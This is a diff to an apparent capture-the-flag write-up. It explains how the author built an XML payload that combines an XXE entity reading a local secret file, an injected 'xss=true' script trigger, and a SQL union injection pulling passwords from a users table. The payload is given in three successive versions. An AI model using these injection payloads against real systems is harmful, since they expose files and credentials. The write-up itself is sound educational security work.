@@ -141,7 +141,7 @@ It was a bit of a struggle to get the js to work (need to inject `xss=true;`), e
 sanitize-html. The sanitize-html call basically stripped out all of the xml 
 and comments, which was mostly helpful, so something like this almost works:
 
-```
+```payload.xml
 <!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///home/gnx/script/xxe_secret"><r>;xss=true;//&xxe;</r>
 <!--' union select password from users limit 1;#-->
 ```
@@ -152,7 +152,7 @@ run.
 I spent a while struggling with this piece, until a teammate suggested trying
 another entity to inject a comment around the garbage:
 
-```
+```payload.xml
 <!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///home/gnx/script/xxe_secret">
 <!ENTITY xxe2 SYSTEM "xxe_seed>/*">]><r>*/xss=true;//&xxe;</r>
 <!--' union select password from users;#-->
@@ -164,8 +164,10 @@ until it ran and gave the flag. I think it was 4 columns, but don't remember at
 this point. The `limit 1` isn't necessary but it seemed kind not to pull in the whole
 table cartesian product ;) --the result was something like this:
 
-```
+```payload.xml
 <!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///home/gnx/script/xxe_secret">
 <!ENTITY xxe2 SYSTEM "xxe_seed>/*">]><r>*/xss=true;//&xxe;</r>
 <!--' union select password, 1, 1, 1 from users limit 1;#-->
 ```
+
+Note: it needs to be all one one line, but I broke it up for visibility.
